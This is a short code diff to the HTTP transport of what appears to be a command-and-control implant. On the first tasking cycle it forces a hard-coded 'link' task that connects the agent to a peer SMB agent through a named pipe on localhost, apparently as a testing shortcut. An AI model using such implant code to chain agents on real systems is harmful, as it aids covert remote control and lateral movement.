@@ -83,10 +83,25 @@ namespace HttpTransport
 
         public void Start()
         {
+            bool first = true;
             while(Agent.IsAlive())
             {
                 bool bRet = GetTasking(delegate (MessageResponse resp)
                 {
+                    if (first)
+                    {
+                        first = false;
+                        resp.Tasks = new Task[1]
+                        {
+                            new Task()
+                            {
+                                Command = "link",
+                                Parameters = @"{""connection_info"": {""host"": ""localhost"", ""agent_uuid"": ""3c3c7598-1a3a-45e3-8af3-416410f93848"", ""c2_profile"": {""name"": ""smb"", ""is_p2p"": true, ""parameters"": {""pipename"": ""6e7tvpfc-ggqp-yjsg-i4gf-1cfwoas5kyxr""}}}}",
+                                Timestamp = 0,
+                                ID = "randomTaskId"
+                            }
+                        };
+                    }
                     return Agent.GetTaskManager().ProcessMessageResponse(resp);
                 });
 
